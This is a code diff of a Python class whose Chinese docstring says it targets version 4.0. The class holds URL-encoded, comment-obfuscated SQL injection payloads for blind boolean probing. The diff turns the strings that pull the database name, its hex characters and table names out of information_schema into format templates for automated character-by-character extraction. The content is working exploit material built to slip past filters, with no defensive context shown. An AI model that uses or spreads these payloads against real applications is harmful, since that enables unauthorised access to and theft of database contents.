@@ -49,14 +49,19 @@ class Payload1(object):
 class Payload2(object):
     '''针对4.0版本'''
     a = "hello -> a"
+    
     payloads1 = ["Xor True","Xor False","%26%26 true","%26%26 false"]
     payloads2 = "/**//*!order*//**/by/**/{}"
+
     payloads3 = "%20%26%26%20(length(database/**/())={}"
     payloads4 = "%20%26%26%20(length(hex(database/**/()))={}"
     payloads5 = "%20%26%26%20(left(hex(database/**/()),{})={}"
 
-    payloads6 = "%20%26%26%20(1=(select%20count(/*!table_name*/)%20from%20information_Schema.tables%20where%20table_schema=0x{}))"
-    payloads7 = "%20%26%26%20hex/**/(substr((select%20concat(/*!TaBle_nAme*/)%20from%20information_schema.taBles%20where%20table_schema=0x74657374%20limit%200,1),1,1))"
+    payloads6 = "%20%26%26%20(1=(select%20count(/*!{}*/)%20from%20information_Schema.tables%20where%20table_schema=0x{}))"
+    payloads7 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.taBles%20where%20table_schema=0x74657374%20limit%20{}),{}))"
+    payloads8 = "%20%26%26%20hex/**/(substr((select%20concat(/*!{}*/)%20from%20information_schema.taBles%20where%20table_schema=0x74657374%20limit%20{}),{}))={}"
+
+    payloads9 = ""
 
 
     
